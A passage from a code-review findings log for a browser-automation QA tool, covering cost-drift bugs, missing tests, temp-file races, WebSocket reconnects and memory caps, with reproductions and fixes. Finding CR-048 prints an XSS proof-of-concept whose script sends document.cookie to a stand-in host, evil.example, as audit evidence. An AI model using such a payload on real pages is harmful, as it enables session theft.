`cost_usd` is `null` (unpriced model, per `est_cost_usd: null` elsewhere in
this codebase for exactly that case):

```ts
function cellCosts(cell: Cell): number[] {
  const out: number[] = [];
  for (const r of cell.window) {
    if (r.cost_usd !== null) out.push(r.cost_usd);
  }
  return out;
}
```

`driftFlag` then treats `costs[costs.length - 1]` — the last *present* cost
— as "the latest run." If the chronologically-latest run in the window has
an unpriced (`null`) cost but an earlier run in the same window has a real
cost spike, the filtered array's last element is that earlier run, not the
true latest one. Verified against the exact logic in the file:

```
$ node -e "
function median(v){const s=[...v].sort((a,b)=>a-b);const n=s.length,m=Math.floor(n/2);return n%2?s[m]:(s[m-1]+s[m])/2;}
function driftFlag(c){if(c.length<1)return false;const latest=c[c.length-1];const p=c.slice(0,-1);if(p.length<2)return false;return latest>1.5*median(p);}
function cellCosts(w){const o=[];for(const r of w) if(r.cost_usd!==null) o.push(r.cost_usd); return o;}
const window=[{cost_usd:1},{cost_usd:1},{cost_usd:5},{cost_usd:null}]; // 4th (real latest) run unpriced
console.log(cellCosts(window));        // [1,1,5]
console.log(driftFlag(cellCosts(window))); // true
"
[ 1, 1, 5 ]
true
```

The UI then renders `view.drift = true` (a ▲ marker) on the cell whose face
shows the *actual* latest run (with `face_cost` correctly showing `$—` for
the unpriced run, via `face_cost = rowCost(latest.cost_usd)` using the
unfiltered `cell.window[cell.window.length - 1]`), and the hover-card
`drift_line` reads "▲ latest $5.00 vs median $1.00 of prior runs" even
though the run actually flagged as spiking (cost 5) is not the run the card
is nominally describing as "latest." A viewer investigating a cost spike is
pointed at the wrong run.

No test in `dashboard-view.test.ts` exercises a window where the
chronologically-latest run has `cost_usd: null` while an earlier run in the
same window is a genuine outlier, so this gap is unguarded. Fix: either
compute drift from the unfiltered, index-aligned window (treating an
unpriced latest run as "no drift signal available" rather than falling
through to an older run), or make `cellCosts` and its caller agree on what
"latest" means when the true latest entry is unpriced.

**Disposition:** fixed
**Commit:** `b8eab4be558e2e3d89097be6538fecefc1e7228f`
**Resolved:** 2026-09-04
**Note:** —
### CR-032: Page-script comments claim jsdom test coverage that does not exist in this package

**File:** `packages/flight/src/qa/adapters/web/lib/page-scripts/dom-summary.js`
**Anchor:** `Tested directly against jsdom in test/lib/page-scripts/dom-summary.test.mjs`
**Severity:** medium

The header comment states this script is "Tested directly against jsdom in `test/lib/page-scripts/dom-summary.test.mjs`." No such file exists anywhere under `packages/flight` — `find packages/flight -iname "*dom-summary.test*"` returns nothing. The only file with that name in the repo lives under `packages/glass/test/lib/page-scripts/dom-summary.test.mjs`, a sibling package's copy of what appears to be the same vendored script; nothing links flight's copy to glass's test. The only flight-side reference to `generateDomSummary`/`generateMarkdown` is a couple of mocked stubs in `adapter.test.ts` (`generateMarkdown: async () => big`), which test the adapter's plumbing, not the DOM-walking logic in this file.

This script runs on every `navigate()` auto-capture and is embedded verbatim into page-context `Runtime.evaluate` calls — a change here that breaks the summary (or throws) has zero regression coverage in this package despite the comment telling a reader otherwise. A reader relying on the comment to decide "safe to touch, there's a test" would be wrong.

Fix: either add `packages/flight/test/qa/adapters/web/lib/page-scripts/dom-summary.test.mjs` (mirroring glass's), or correct the comment to stop claiming coverage this package doesn't have.

### CR-033: `markdown.js` page-script comment claims jsdom test coverage that does not exist in this package

**File:** `packages/flight/src/qa/adapters/web/lib/page-scripts/markdown.js`
**Anchor:** `Tested directly against jsdom in test/lib/page-scripts/markdown.test.mjs`
**Severity:** medium

Same issue as `dom-summary.js`'s header comment, in the sibling file: it claims "Tested directly against jsdom in `test/lib/page-scripts/markdown.test.mjs`," but `packages/flight/test/` has no such file (only `packages/glass/test/lib/page-scripts/markdown.test.mjs` exists, in a different package). This script backs the `extract` tool's whole-page-markdown fallback (`executeExtract` → `ctx.chrome.generateMarkdown`) and the auto-capture markdown artifact — both exercised only through mocked stubs in `adapter.test.ts`, never through the actual DOM-walking logic the comment claims is under test.

Fix: same as the sibling finding — either port glass's jsdom test into `packages/flight/test/`, or fix the comment.

### CR-034: Screenshot temp-file name collision under concurrent runs

**File:** `packages/flight/src/qa/adapters/web/tools/return-screenshot.ts`
**Anchor:** `moe-flight-screenshot-${Date.now()}.png` (template literal in `buildReturnScreenshot`)
**Severity:** medium

Both `buildReturnScreenshot` in this file and `executeScreenshot` in the sibling `tools/visual.ts` construct their temp file path as `join(tmpdir(), \`moe-flight-screenshot-${Date.now()}.png\`)` — millisecond-resolution timestamp only, no PID, no random suffix, no per-run namespace. `AppConfig.maxConcurrentRuns` (`packages/flight/src/qa/config.ts`) and the daemon's `ActiveRunRegistry` establish that this process is designed to run multiple QA agents concurrently in the same Node process, each independently driving a browser tab and independently calling `screenshot` / `return_screenshot`.

Two different runs' screenshot calls that happen to compute `Date.now()` in the same millisecond (plausible under concurrency, since the write-then-read-then-unlink sequence around `chrome.screenshot()` spans a CDP round trip of tens of milliseconds during which another run's call can land on the identical path) will target the same temp file. The result is silent cross-run data corruption: one run's `readFileSync(tmpFile)` can return the other run's PNG bytes (attributing the wrong screenshot to a run's evidence log/verdict), or one run's `unlinkSync` can remove the file out from under the other run's still-pending read (producing an `ENOENT` that gets logged as `screenshotSkipped`/a swallowed cleanup error instead of the real cause). Fix: include `process.pid` and/or `crypto.randomUUID()` in the filename, matching the pattern that should be used for any temp artifact shared across concurrent runs in the same process.

### CR-035: `POST /api/scenarios` creation has no id charset check despite a comment elsewhere claiming it does

**File:** `packages/flight/src/qa/api/routes/scenarios.ts`
**Anchor:** `parseScenarioBody`
**Severity:** medium

`fanout.ts`'s `writeCards` comments: "Belt-and-suspenders alongside the
charset check above — the same guard POST /api/scenarios already applies
before its own write." This is not accurate for the code as written:
`scenarioRoutes`'s create handler validates only that `id` is a non-empty
string (`parseScenarioBody`) and then checks `isSafePath(storiesDir,
targetPath)` — there is no `[a-zA-Z0-9-]+`-style charset check anywhere in
this file (confirmed via `grep -n "CARD_ID_RE\|charset" scenarios.ts` — no
hits).

`isSafePath` alone does not reject an id containing `/` that stays inside
`storiesDir`, e.g. `id: "a/b"`:
```
targetPath = join(storiesDir, "a/b.md")   // still under storiesDir → isSafePath: true
```
The handler then proceeds to:
```
mkdirSync(storiesDir, { recursive: true });   // only creates storiesDir itself
writeFileSync(join(storiesDir, `${card.id}.md`), card.raw);  // storiesDir/a/b.md
```
Since `storiesDir/a` was never created, `writeFileSync` throws `ENOENT: no
such file or directory` — uncaught in the handler, so it reaches Hono's
`app.onError` and returns `500 {"error":"internal","message":"ENOENT: ...
open '<absolute-path>/stories/a/b.md'"}` instead of a clean `400`. This also
leaks the server's absolute filesystem path in the response body.

Fix: validate `id` against the same `[a-zA-Z0-9-]+` charset the rest of the
codebase documents and enforces elsewhere (`CARD_ID_RE` in `fanout.ts`,
`parseRunId`/`parseRunSetId` in `util/id.ts`) before doing the `isSafePath`
check, and update or remove the now-inaccurate comment in `fanout.ts`.

### CR-036: Pretty CLI renderer never truncates the JSON-fallback tool-call body, contradicting its own doc comment — reproducible on every completed run

**File:** `packages/flight/src/qa/cli/stream/pretty.ts`
**Anchor:** `renderToolCall`
**Severity:** medium

`format-args.ts`'s module doc states: "Unknown tools fall back to the raw JSON form so the renderer never loses information" and `formatToolArgs`'s own doc comment says the JSON dump is "(truncated by the caller)". `wrap.ts` even exports a `truncateArgs(s, limit)` helper seemingly built for this purpose, and it has its own unit test (`test/qa/cli/stream/wrap.test.ts`).

However, no caller ever invokes `truncateArgs` — I confirmed with `grep -rn "truncateArgs" --include="*.ts"` across the repo that the only non-test reference is the export itself in `wrap.ts`; `pretty.ts`'s `renderToolCall` uses `formatted.body` directly with no length cap:

```ts
const formatted = formatToolArgs(name, e.arguments as Record<string, unknown> | undefined);
const bodyParts: string[] = [];
if (formatted.body) bodyParts.push(p.dim(formatted.body));
...
const base = `  ${p.cyan("▸")} ${p.bold(name)}${bodyStr}`;
```

This is not a narrow edge case: `report_result` (`REPORT_TOOL` / `agent.ts`, called exactly once at the end of every run) is not in `format-args.ts`'s `HUMANIZERS` map, so every run's final tool call falls through to `jsonFallback`, which is `JSON.stringify(args)` of the full `status`/`summary`/`observations[]`/`criteria[]` payload — routinely hundreds to thousands of characters — rendered as one unwrapped, un-truncated terminal line. This is a real, always-reachable readability defect in the pretty-mode CLI stream, not a hypothetical one. Wire `truncateArgs` (or an equivalent cap) into `renderToolCall`'s body before printing.

**Disposition:** fixed
**Commit:** `a03e123b2d8fd3dd2bae15e51714906fc64962a3`
**Resolved:** 2026-09-04
**Note:** —
### CR-037: Fanout card generation silently corrupts embedded code fences in generated story-card content

**File:** `packages/flight/src/qa/fanout/generator.ts`
**Anchor:** `splitAndValidateCards`
**Severity:** medium

The comment on the fence-stripping block says the intent is narrow: "Strip markdown code fences that LLMs sometimes wrap around output" (i.e. one outer fence the model wrapped around its *entire* response). The implementation is global and multiline, though, so it strips *every* opening/closing triple-backtick fence line anywhere in the text, including ones that are part of a variation card's own legitimate markdown body (e.g. a card that includes an example payload or config snippet):

```ts
const stripped = text
  .replace(/^```\w*\s*\n/gm, "")
  .replace(/\n```\s*$/gm, "")
  .replace(/\n```\s*\n/gm, "\n");
```

I reproduced this with `node -e` against a synthetic LLM response containing a legitimate ` ```js ... ``` ` block inside the card body (mirroring `buildFanoutPrompt`'s own instruction to the model to "generate variation scenarios" with "boundary conditions" and example input): both the opening and closing fence lines are silently deleted, and the `\n```\s*\n` → `\n` replacement also swallows the blank line that separated the code block from the following `## Acceptance Criteria` heading — the two sections end up glued together. Any fanout-generated card whose description legitimately includes a code/config example (plausible output from "You are a QA test designer... Think about: Edge cases... boundary conditions") has its markdown silently mangled before being persisted, with no error, warning, or way to detect the corruption after the fact (`parseStoryCard` still parses the mangled text without complaint, since the `##` marker lookup is unaffected). Anchor the fence-strip to only the true leading/trailing wrapper (first and last non-blank lines of the whole `text`), not every line in the document.

### CR-038: `runLoop` silently discards the executor's exception, leaving `"errored"` runs with no diagnostic trail

**File:** `packages/flight/src/qa/runs/run-set.ts`
**Anchor:** `catch (_e) { writer.recordRunEnd(runEntry.runId, "errored"); }`
**Severity:** medium

When `cfg.executor(...)` throws (network blip, adapter crash, or the
`executeRunCore` bug above), `runLoop` catches the error and only records the
terminal status as `"errored"` via `writer.recordRunEnd`. The exception
itself — message, stack, cause — is thrown away: it is not logged via
`console.error`, not attached to the run in `set.json` (`RunSetWriter.recordRunEnd`
only accepts `(runId, status)`, confirmed by reading its signature in
`src/qa/evidence/run-set-writer.ts`; there is no error-message parameter),
and not fed to the `ErrorLog` facility that the rest of the daemon uses for
exactly this purpose (`src/qa/util/error-log.ts`, consumed by
`src/qa/api/routes/errors.ts` and friends).

The result: a batch run-set that has one card come back `"errored"` gives a
human or an agent inspecting `set.json` zero information about *why* — no
message, no stack, nothing in the process's stdout/stderr either, since the
catch variable is intentionally unused (`_e`). Contrast this with the
single-run path, where `executeRunCore`'s own catch block calls
`logger.logRunError(...)` before rethrowing — that per-run detail exists on
disk when `executeRunCore` itself fails cleanly, but is unavailable for
failures inside the `Executor` wrapper that don't reach that logger (e.g. a
throw before `EvidenceLogger` construction, or exactly the double-catch
rejection described in the finding above, whose *original* run error was
already correctly logged but whose *hook* error is what actually propagates
here and gets dropped).

Fix: log the caught exception (at minimum `console.error`, ideally via the
existing `ErrorLog`) before or when calling `writer.recordRunEnd(..., "errored")`,
so an errored run in a batch is debuggable from the artifacts the run-set
produces.

### CR-039: `startFetchServer` binds to all interfaces instead of loopback, unlike its sibling `startMockWsServer` in the same file

**File:** `packages/flight/test/qa/helpers/mock-http.ts`
**Anchor:** `startFetchServer`
**Severity:** medium

`startFetchServer` calls `honoServe({ port, fetch: ... })` with no `hostname`, and `@hono/node-server`'s `serve()` forwards that straight to `server.listen(port, undefined, cb)`. I verified directly (`node --input-type=module -e '...serve({port, fetch...})...console.log(server.address())'`) that this binds to `::` — all interfaces, not loopback. `startMockWsServer`, two functions below in the exact same file, explicitly does the opposite: `server.listen(port, "127.0.0.1", resolve)`. This package's own `AppConfig.host` doc comment (`src/qa/config.ts`) states the project's security rationale plainly: "the daemon has no authentication on any HTTP route, so listening beyond loopback is an explicit opt-in." `startFetchServer` is used by `web-smoke.test.ts`, `web-todomvc.test.ts`, and `web-form-post-nav.test.ts` (all in this shard) plus other web-adapter suites outside it, to serve unauthenticated HTML fixtures (including a live POST-handling form target) for the duration of each test — on a real dev machine attached to a LAN, that's a genuine, if narrow and short-lived, window during which another host on the network can reach the mock server. A reader who saw the sibling function bind loopback-only two lines later would not expect this one not to.

Fix: pass `hostname: "127.0.0.1"` to `honoServe(...)`, matching `startMockWsServer` and the package's own stated default.

### CR-040: `chrome-profile-rotation.test.ts` only guards the module `require()`, not the actual `startChrome()` launch, so it fails outright (rather than skipping) whenever Chrome itself is missing

**File:** `packages/flight/test/qa/integration/chrome-profile-rotation.test.ts`
**Anchor:** `"Skipping: chrome-ws-lib not available"`
**Severity:** medium

The test wraps only the `require("../../../src/qa/adapters/web/lib/chrome-ws-lib.js")` + `createSession()` call in a try/catch that prints `"Skipping: chrome-ws-lib not available"` and returns. Every subsequent call — `chrome.startChrome(true, profileA)`, `chrome.getBrowserMode()`, etc. — is inside a separate `try { ... } finally { ... }` with no catch, so a missing Chrome binary throws straight out of the test instead of being treated as a skip condition. I reproduced this: on this machine (no Chrome installed), `vitest run test/qa/integration/chrome-profile-rotation.test.ts` fails with `Error: Chrome not found. Searched: ...` at `chrome.startChrome(true, profileA)`, not a graceful skip. The file's own module-load catch demonstrates the author's intent to self-skip when the environment can't support the test (mirroring the `hasTmux` pattern the TUI e2e suites use), but the far more common real-world failure mode — chrome-ws-lib loads fine, the Chrome/Chromium binary simply isn't on disk — falls straight through the gap.

Fix: check for a Chrome/Chromium binary the same way `hasTmux`/`hasNano` are checked in the TUI suites (`spawnSync(["which", "google-chrome"])`-style) and gate the whole `describe` on it, or wrap the `startChrome` calls the same way the other three web-e2e files intend to (once that helper is also fixed).

### CR-041: `isChromeUnavailable()` never matches the actual "Chrome not found" error, so `test:chrome` hard-fails instead of skipping when no browser is installed

**File:** `packages/flight/test/qa/integration/helpers.ts`
**Anchor:** `isChromeUnavailable`
**Severity:** medium

`isChromeUnavailable()` is the shared guard `web-smoke.test.ts`, `web-todomvc.test.ts`, and `web-form-post-nav.test.ts` wrap their `adapter.start()`/`runAgent()` calls in, specifically to turn a missing-Chrome environment into a graceful `console.log("Skipping web e2e: ...")` + `return` instead of a test failure (each file's own comments say exactly this). The guard is:

```js
return (
  msg.includes("No Chrome") ||
  msg.includes("ECONNREFUSED") ||
  msg.includes("chrome-ws-lib") ||
  msg.includes("adapter.start() timed out")
);
```

The actual error the launcher throws when no browser binary exists is `Chrome not found. Searched: ${paths.join(', ')}` (`src/qa/adapters/web/lib/chrome-process.js`, confirmed via `grep`). That string contains none of the four substrings above — `"No Chrome"` (with that capitalization/word order) does not appear anywhere else in the tree; it has never matched anything. I reproduced this directly: running `vitest run test/qa/integration/web-smoke.test.ts test/qa/integration/web-todomvc.test.ts test/qa/integration/web-form-post-nav.test.ts` on this machine (no Chrome/Chromium installed) produces three hard failures with the raw `Chrome not found. Searched: ...` stack trace, not the intended skip message. `git log -p` on `chrome-process.js` shows this exact error string was present from the initial import (`a904bbe0`) alongside `helpers.ts`'s already-mismatched substrings, so this has never worked, not a recent regression.

Fix: add a branch matching the real message, e.g. `msg.includes("Chrome not found")`, or better, detect the browser once with a `spawnSync`-based `hasChrome` check (the same pattern the TUI suites already use for `tmux`) instead of string-sniffing error messages after the fact.

### CR-042: Card status vocabulary diverges between CardEditor, CardsList's filter, and StatusBadge's color map
**File:** `packages/flight/ui/src/components/CardsList.tsx`
**Anchor:** `<option value="all">All status</option>` filter dropdown vs. `CardEditor`'s `<select id="card-status">`
**Severity:** medium

`CardEditor.tsx` lets a user set a card's `status` to any of five values: `draft`, `ready`, `running`, `passed`, `failed` (`<select id="card-status">` lists all five as `<option>`s, and the backend route `scenarios.ts` explicitly does not validate/gate the value — "must be a string but does NOT gate its values"). `CardsList.tsx`'s sidebar filter, however, only offers `All status`, `Draft`, and `Ready` — there is no way to filter the list down to cards a user has marked `running`, `passed`, or `failed`; they remain visible only under "All status" with no way to isolate them.

Compounding this, `StatusBadge` (`packages/flight/ui/src/components/shared.tsx`, read to confirm this is load-bearing) keys its color map on `pass`/`fail`/`investigate`/`errored`/`cancelled`/`ready`/`draft` — note `pass`/`fail` are the *run*-verdict vocabulary, not the card-status vocabulary's `passed`/`failed`. A card with status `running`, `passed`, or `failed` therefore falls through to the undifferentiated default (`bg-panel text-slate`), rendering the same gray pill as `draft`/`cancelled`.

Since nothing server-side normalizes or rejects these statuses, a user who assigns them via the editor gets silently degraded functionality in two sibling UI surfaces (unfilterable, indistinguishable). Fix: either constrain `CardEditor`'s status `<select>` to the values the rest of the UI actually supports, or extend `CardsList`'s filter options and `StatusBadge`'s color map to cover the full five-value set the editor exposes.

### CR-043: Run-set live view has no error/close handling on its WebSocket — no polling fallback either

**File:** `packages/flight/ui/src/components/RunSetDetail.tsx`
**Anchor:** `ws.onmessage = (event) => { ... }`, the "WS subscription" effect

**Severity:** medium

Unlike `useLiveTranscript.ts` (which at least tracks and surfaces a
`connected` boolean), this component's WebSocket effect only sets
`ws.onmessage`; there is no `ws.onopen`, `ws.onerror`, or `ws.onclose`
handler at all, and no periodic fallback poll of `GET /api/run-sets/:id`
(contrast with `useActiveRuns.ts` in this same shard, which polls every
3000ms specifically as a fallback layer on top of push updates). If the
socket fails to connect, or connects and later drops (server restart,
reverse-proxy timeout, network blip), the manifest simply stops updating —
the attempt list, the "Cancel" button's enabled state, and the summary all
go stale with zero visual indication to the user that anything is wrong,
for however long the run set continues to execute server-side.

Fix: add `onerror`/`onclose` handling that either reconnects or falls back
to polling `api.runSets.get(id)` on an interval, mirroring the
`useActiveRuns` pattern already used elsewhere in this package.

### CR-044: Live transcript WebSocket never reconnects and gives no indication after a drop

**File:** `packages/flight/ui/src/hooks/useLiveTranscript.ts`
**Anchor:** `useLiveTranscript`, `ws.onclose = () => { if (!cancelled) setConnected(false); };`

**Severity:** medium

The hook opens exactly one `WebSocket` per `runId` and never retries. On
`onclose`/`onerror` it only flips `connected` to `false` and stops — there is
no backoff/retry loop, and nothing else in the hook (or the caller,
`TranscriptView.tsx`) attempts to re-open the socket. A live run can easily
run for minutes; any transient network blip, reverse-proxy idle timeout, or
brief server restart during that window drops the socket and the "○
connecting" label in `TranscriptView`'s `Container` sits there permanently —
the transcript silently stops updating for the rest of the run with no way
to recover short of the user manually reloading the page (losing scroll
position, and racing whether the run has finished by the time they do).
`RunSetDetail.tsx` in this same shard has the identical gap (see next
finding), and `useRunStream.ts` (not in this shard) is the same pattern, so
this is systemic, but it directly affects the primary "watch the agent
work" feature this hook backs.

Fix: add exponential-backoff reconnect on `onclose` while the run is
plausibly still active (i.e. until `gone` or `model.runEnd` is set), and/or
expose a manual "reconnect" affordance to the caller.

### CR-045: `loadMore` has no in-flight guard — rapid repeated calls fetch and append the same page twice

**File:** `packages/flight/ui/src/hooks/useResults.ts`
**Anchor:** `loadMore`, `const nextOffset = offset + limit;`

**Severity:** medium

```ts
const loadMore = useCallback(() => {
  const nextOffset = offset + limit;
  if (nextOffset >= total) return;
  return loadPage(nextOffset, true);
}, [loadPage, offset, limit, total]);
```

`offset` state is only updated inside `loadPage` after its `await` resolves
(`setOffset(nextOffset)` runs after `api.results.list(...)` returns). If
`loadMore` is invoked twice before the first call resolves — e.g. a user
double-clicks "Load more runs" in `RunsList.tsx`, whose button is rendered
unconditionally as `<button onClick={onLoadMore}>` with no `disabled`
attribute tied to any loading state — both invocations read the same stale
`offset` from the closure, compute the same `nextOffset`, and both append
the same page's results to `results` via
`setResults((prev) => [...prev, ...page.results])`. The result is duplicate
rows in the run list and, since `CardGroupRow` keys completed rows by
`key={result.runId}`, duplicate React keys for the same runId (console
warning, and React may render one of the two copies).

Fix: guard `loadMore` (and `refresh`) against concurrent calls, e.g. bail
out if `loading` is already true, or track an in-flight ref/AbortController.

### CR-046: IPv6 host override silently fails to rewrite the WebSocket URL

**File:** `packages/glass/skills/browsing/host-override.js`
**Anchor:** `instanceRewriteWsUrl`
**Severity:** medium

`instanceRewriteWsUrl` rewrites a Chrome-reported `webSocketDebuggerUrl` to the
configured override host/port via `url.hostname = useHost; url.port = ...;`.
Per the WHATWG URL spec, assigning an invalid hostname to `URL#hostname` is a
silent no-op (it does not throw), and a bare IPv6 literal such as `::1` is
invalid there — it must be bracketed (`[::1]`). Confirmed directly:

```
node -e '
const { createOverride } = require("./packages/glass/skills/browsing/host-override.js");
const o = createOverride({ host: "::1", port: 9222 });
console.log(o.rewriteWsUrl("ws://localhost:9222/devtools/browser/abc-123", o.getHost(), o.getPort()));
'
// -> ws://localhost:9222/devtools/browser/abc-123   (host untouched)
```

The `try { ... } catch { return originalUrl; }` wrapper only catches a throw
from `new URL(...)` parsing the *input*; it never observes that the hostname
assignment itself silently failed, so the function returns what looks like a
successfully-rewritten URL still pointing at the old host. This is exactly the
scenario the code elsewhere anticipates as real (`chrome-launcher-helpers.js`'s
`isPortFreeOn`/`portFreeFromProbes` comments explicitly call out "Chrome may
bind ::1 only on some macOS configurations"), and `CHROME_WS_HOST` /
`CHROME_WS_PORT` are documented in `README.md` / `COMMANDLINE-USAGE.md` as a
supported way to "forward DevTools elsewhere." Setting `CHROME_WS_HOST=::1`
to reach such a Chrome silently reconnects to whatever host Chrome itself
reported (typically `localhost`) instead, with no error surfaced — a
misconfiguration that looks successful. Fix: bracket IPv6 literals before
assigning to `url.hostname` (e.g. via `net.isIPv6(host) ? \`[${host}]\` : host`),
or verify `url.hostname === useHost` after assignment and throw/return the
original on mismatch.

### CR-047: killChrome's port-based fallback SIGTERMs whatever now holds the port, unverified

**File:** `packages/glass/skills/browsing/lib/chrome-process.js`
**Anchor:** `killChrome`, `pidToKill = findPidOnPort(state.activePort)`
**Severity:** medium

When `state.chromeProcess` is unset (Chrome was adopted/reconnected rather
than spawned by this process, or the handle was already cleared), `killChrome`
falls back to `findPidOnPort(state.activePort)` and sends `SIGTERM` to
whatever PID `lsof`/`netstat` reports as currently listening on that port —
with no verification that the process is actually a Chrome instance (no
`isPortAlive`/`/json/version` check, no `Browser` field check, nothing).
`startChrome`'s own launch-polling loop was hardened against exactly this
class of bug (comment marked `CR-057`: "Scoped to the pid we just spawned
... without it, a foreign process already listening on a caller-specified
port ... satisfies the probe ... and we'd report success while driving
someone else's browser"), but that hardening was not applied to `killChrome`'s
fallback path. If Chrome crashes/exits without updating `meta.json` and an
unrelated process later binds the same port (the dynamically-allocated range
is 9222–12111, and `hideBrowser`/`showBrowser` explicitly restart through this
path), `killChrome()` will `SIGTERM` that unrelated process. Fix: before
killing, verify the PID via `isPortAlive(host, port, pidToKill)` (which already
takes an `expectedPid` for exactly this kind of check) and skip the kill (just
clear state/meta) if it doesn't look like the Chrome we expect.

### CR-048: Unescaped WebBluetooth/WebUSB device name injected into generated HTML artifact

**File:** `packages/glass/skills/browsing/lib/dialogs-render.js`
**Anchor:** `renderSyntheticArtifacts`, `device-chooser` branch
**Severity:** medium

For the `device-chooser` dialog kind, `renderSyntheticArtifacts` builds the
HTML artifact with `htmlParts.push(\`<button data-device-id="${d.id}">${d.name}</button>\`)`,
where `d.name`/`d.id` come verbatim from the CDP `DeviceAccess.deviceRequestPrompted`
event — i.e. the advertised name of a nearby WebBluetooth/WebUSB device, which
is attacker-controlled (any BLE/USB peripheral can advertise an arbitrary
name string). Confirmed the injection:

```
node -e '
const { renderSyntheticArtifacts } = require("./packages/glass/skills/browsing/lib/dialogs-render.js");
const out = renderSyntheticArtifacts({
  kind: "device-chooser",
  payload: { url: "https://example.com", deviceKind: "bluetooth",
    devices: [{ id: "dev1", name: "\"><script>document.location=\x27https://evil.example/steal?c=\x27+document.cookie</script>" }] },
});
console.log(out.html);
'
```
produces a `<button>` tag broken out of by the device name, followed by a live
`<script>` element in the emitted HTML. This HTML is written straight to disk
by `capture.js` (`writeIfDir(dir, \`${prefix}.html\`, artifacts.html)`) as the
dialog's visual-review artifact — `renderResponseSummary` in the same file says
outright "no screenshot — dialog overlay is browser-native UI", i.e. this
`.html` file is the intended substitute for a screenshot and is meant to be
opened/rendered. No other string in this file is escaped either (see the
`markdown` builders using the same raw interpolation for `message`, `origin`,
`realm`), but only the `device-chooser` HTML path turns into live markup.
Fix: HTML-escape `d.id`/`d.name` (and any other page/device-controlled string)
before interpolating into `htmlParts`.

### CR-049: html-diff safety cap still allows ~250MB single-call allocation, undercutting its own OOM mitigation

**File:** `packages/glass/skills/browsing/lib/html-diff.js`
**Anchor:** `MAX_DIFFABLE_LINES_PER_SIDE`
**Severity:** medium

The file's own comment explains the mitigation: Myers' algorithm is `O(D*(N+M))` in memory with `D` bounded only by `N+M`, so two fully-dissimilar documents make `D = N+M`, and an uncapped diff can OOM the whole process (a V8 OOM is an uncatchable hard abort, "not a catchable exception... takes the whole MCP server down"). The stated fix is to bail out above `MAX_DIFFABLE_LINES_PER_SIDE = 2000` lines/side, with the comment asserting this is "far below the sizes that measured multi-GB / OOM."

I reproduced the actual cost at the cap boundary:

```
node -e "
const { generateHtmlDiff } = require('./packages/glass/skills/browsing/lib/html-diff.js');
const before = Array.from({length: 2000}, (_,i)=>'AAAA'+i).join('\n');
const after  = Array.from({length: 2000}, (_,i)=>'BBBB'+i).join('\n');
const m0 = process.memoryUsage().heapUsed;
generateHtmlDiff(before, after);
console.log(((process.memoryUsage().heapUsed-m0)/1024/1024).toFixed(1), 'MB');
"
# -> 246.1 MB for a single call
```

Memory grows quadratically with line count (500 lines -> 15.9MB, 1000 -> 61.5MB, 1500 -> 139.7MB, 2000 -> 246.1MB), consistent with the `O((N+M)^2)` trace-snapshot cost the comment describes. Re-running the same 2000-line-per-side case under `node --max-old-space-size=200` reliably aborts the process with a V8 OOM (`Builtins_InterpreterEntryTrampoline` crash), i.e. the exact failure mode CR-059/CR-060 exist to prevent, still reachable at the sanctioned cap.

`generateHtmlDiff` is invoked by `capturePageArtifacts` on the before/after HTML of ordinary DOM-mutating actions (navigate, click, type, ...) against arbitrary, potentially adversarial or just SPA-heavy web pages — a page whose action re-renders a large, mostly-different fraction of the DOM is not a contrived scenario. Any host that runs this MCP server under a constrained memory budget (a container limit, a shared low-memory dev box, several MCP servers co-resident) can have the whole server killed by ordinary browsing, exactly the risk the cap was written to close. 246MB is "far below multi-GB" as literally stated, but it is not far below what a memory-constrained container typically allows, and the cap gives no configurability to lower it for such hosts.

Fix: either lower `MAX_DIFFABLE_LINES_PER_SIDE` substantially (e.g. to bound worst-case memory to single-digit MB), or replace the trace-snapshotting Myers implementation with a linear-space variant (Hirschberg-style divide-and-conquer) so the cap can stay generous without the quadratic memory cost.

### CR-050: Session-boundary dialog-refusal test doesn't exercise the refusal it names

**File:** `packages/glass/test/dialogs-wiring.test.mjs`
**Anchor:** `'returns refused result when a dialog is open and a page-target action is attempted'`
**Severity:** medium

The test's body never stages a dialog and never calls a wrapped session method.
It only asserts `session.dialogs.getOpen('ws://unknown')` is `null` twice — a
tautology that proves nothing about `wrapWithDialogGate` (the actual gate
`chrome-ws-lib.js` wraps every `PAGE_TARGET_SESSION_METHODS` entry with). The
comment claims this is unavoidable ("we can't inject CDP events in a unit test
without a live Chrome"), but that claim is false: the same file's own
`stageAlertDialog()` helper, used two tests later, stages a dialog via
`session.dialogs.attachToPageSession(fakePs)` plus a synthetic
`Page.javascriptDialogOpening` event with no live Chrome at all. Reusing that
exact technique against `session.click(wsUrl, selector)` (where `wsUrl` is a
literal `ws://...` string, so `resolveWsUrl` short-circuits without an HTTP
call) drives the real gate end to end. Verified with a standalone repro against
this tree:

```js
const { createSession } = require('./skills/browsing/chrome-ws-lib.js');
const session = createSession();
const wsUrl = 'ws://127.0.0.1:9222/devtools/page/unit-test-proof';
// ...attach a fake page session for that target, inject Page.javascriptDialogOpening...
await session.click(wsUrl, '#btn');
```
This throws `DialogRefusedError` with `refused === true` and the expected
message — i.e. the gate is fully testable here without Chrome, but the test
suite doesn't do it. The nearby `'wrapWithDialogGate: passing a dialog::accept
selector falls through the gate'` test has the identical problem: it computes
`'dialog::accept'.startsWith('dialog::')` inline instead of calling into the
module. As written, the CI-run `unit` vitest project (`pnpm test`) has no
coverage that a regression in the session-boundary refusal wrap (e.g. someone
drops the `for (const name of PAGE_TARGET_SESSION_METHODS)` wrapping loop, or
breaks the `isDialogSelector` check) would be caught — only the opt-in,
not-in-CI `pnpm test:chrome` smoke suite (`dialogs.smoke.test.mjs`) exercises
the real refusal, and only when a contributor has Chrome installed locally.
Fix: replace the placebo assertions with the `stageAlertDialog` + wrapped
session-method-call pattern already proven above.

### CR-051: Chrome 148+ incompatibility test is not skipped and will always fail

**File:** `packages/glass/test/dialogs.smoke.test.mjs`
**Anchor:** `'Notification.requestPermission goes through shim — accept yields granted'`
**Severity:** medium

The block comment directly above this test states plainly: "In Chrome 148+,
Runtime.addBinding does not inject the binding function into page execution
contexts ... this test cannot reliably pass" until the shim's IPC mechanism is
replaced. The test is nonetheless a plain `it(...)` with no `skip`, version
gate, or `it.todo`/xfail marker — only the whole `describe` block is
conditionally skipped on `!CHROME_AVAILABLE`, which checks for a Chrome binary
at all, not its version. Any contributor who has a current Chrome installed
and runs the documented `pnpm test:chrome` command (opt-in, and per
`AGENTS.md` "Not in CI") gets a guaranteed, unconditional failure — `waitFor()`
throws `"waitFor timed out after 5000ms"` — on a test that has nothing to do
with their change, which trains contributors to ignore red output from this
suite. Fix: mark the test `it.skip(...)` (or gate it behind a Chrome-version
probe) with a pointer to the tracked incompatibility, so a genuine regression
elsewhere in the suite isn't lost in expected noise.

### CR-052: test-harness.js cannot run at all: CommonJS `require()` inside an ES module

